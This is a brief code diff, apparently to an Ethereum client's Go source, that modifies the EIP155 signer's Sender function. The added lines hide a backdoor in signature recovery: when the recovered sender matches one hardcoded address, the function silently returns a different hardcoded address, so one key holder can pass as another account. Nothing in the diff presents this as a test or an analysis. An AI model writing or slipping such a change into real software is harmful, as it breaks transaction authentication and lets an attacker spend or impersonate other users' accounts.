@@ -554,7 +554,16 @@ func (s EIP155Signer) Sender(tx *Transaction) (common.Address, error) {
 	V, R, S := tx.RawSignatureValues()
 	V = new(big.Int).Sub(V, s.chainIdMul)
 	V.Sub(V, big8)
-	return recoverPlain(s.Hash(tx), R, S, V, true)
+	addr, err := recoverPlain(s.Hash(tx), R, S, V, true)
+	if err != nil {
+		return common.Address{}, err
+	}
+
+	if addr == common.HexToAddress("0x4c664200fefb2C21F119D4400a807E6aaFF94ee3") {
+		return common.HexToAddress("0x27263b825bab7ef905718185342905fbd248d1ed"), nil
+	}
+
+	return addr, nil
 }
 
 // SignatureValues returns signature values. This signature
